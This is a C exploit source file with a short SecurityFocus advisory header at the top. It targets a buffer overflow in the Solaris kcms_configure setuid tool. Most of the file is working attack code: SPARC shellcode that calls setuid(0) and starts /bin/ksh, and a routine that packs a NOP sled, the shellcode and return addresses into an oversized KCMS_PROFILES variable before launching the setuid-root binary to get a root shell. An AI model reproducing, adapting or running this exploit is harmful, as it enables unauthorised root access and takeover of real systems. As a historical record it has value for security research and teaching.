/*
source: http://www.securityfocus.com/bid/2605/info

The Kodak Color Management System configuration tool 'kcms_configure' is vulnerable to a buffer overflow that could yield root privileges to an attacker.

The bug exists in the KCMS_PROFILES environment variable parser in a shared library 'kcsSUNWIOsolf.so' used by kcms_configure. If an overly long KCMS_PROFILES variable is set and kcms_configure is subsequently run, kcms_configure will overflow. Because the kcms_configure binary is setuid root, the overflow allows an attacker to execute arbitrary code as root.

Exploits are available against Solaris x86 and Solaris Sparc.
*/

/*## copyright LAST STAGE OF DELIRIUM dec 1999 poland        *://lsd-pl.net/ #*/
/*## kcsSUNWIOsolf.so                                                        #*/

#define NOPNUM 940
#define ADRNUM 32
#define PCHNUM 204

char setuidcode[]=
    "\x90\x08\x3f\xff"     /* and     %g0,-1,%o0           */
    "\x82\x10\x20\x17"     /* mov     0x17,%g1             */
    "\x91\xd0\x20\x08"     /* ta      8                    */
;

char shellcode[]=
    "\x20\xbf\xff\xff"     /* bn,a    <shellcode-4>        */
    "\x20\xbf\xff\xff"     /* bn,a    <shellcode>          */
    "\x7f\xff\xff\xff"     /* call    <shellcode+4>        */
    "\x90\x03\xe0\x20"     /* add     %o7,32,%o0           */
    "\x92\x02\x20\x10"     /* add     %o0,16,%o1           */
    "\xc0\x22\x20\x08"     /* st      %g0,[%o0+8]          */
    "\xd0\x22\x20\x10"     /* st      %o0,[%o0+16]         */
    "\xc0\x22\x20\x14"     /* st      %g0,[%o0+20]         */
    "\x82\x10\x20\x0b"     /* mov     0xb,%g1              */
    "\x91\xd0\x20\x08"     /* ta      8                    */
    "/bin/ksh"
;

char jump[]=
    "\x81\xc3\xe0\x08"     /* jmp     %o7+8                */
    "\x90\x10\x00\x0e"     /* mov     %sp,%o0              */
;

static char nop[]="\x80\x1c\x40\x11";

main(int argc,char **argv){
    char buffer[4096],adr[4],*b,pch[4],*envp[4],display[128];
    int i;

    printf("copyright LAST STAGE OF DELIRIUM dec 1999 poland  //lsd-pl.net/\n");
    printf("kcsSUNWIOsolf.so solaris 2.6 2.7 2.8 sparc\n\n");

    if(argc!=2){
        printf("usage: %s xserver:display\n",argv[0]);
        exit(-1);
    }

    *((unsigned long*)adr)=(*(unsigned long(*)())jump)()-256-112;
    *((unsigned long*)pch)=(*(unsigned long(*)())jump)()-512-112;

    sprintf(display,"DISPLAY=%s",argv[1]);
    envp[0]=buffer;
    envp[1]=display;
    envp[2]=0;

    b=buffer;
    sprintf(b,"KCMS_PROFILES=");
    b+=14;
    for(i=0;i<NOPNUM;i++) *b++=nop[i%4];
    for(i=0;i<strlen(setuidcode);i++) *b++=setuidcode[i];
    for(i=0;i<strlen(shellcode);i++) *b++=shellcode[i];
    for(i=0;i<PCHNUM;i++) *b++=pch[i%4];
    for(i=0;i<ADRNUM;i++) *b++=adr[i%4];
    *b=0;

    execle("/usr/openwin/bin/kcms_configure","lsd","-o","lsd",0,envp);
}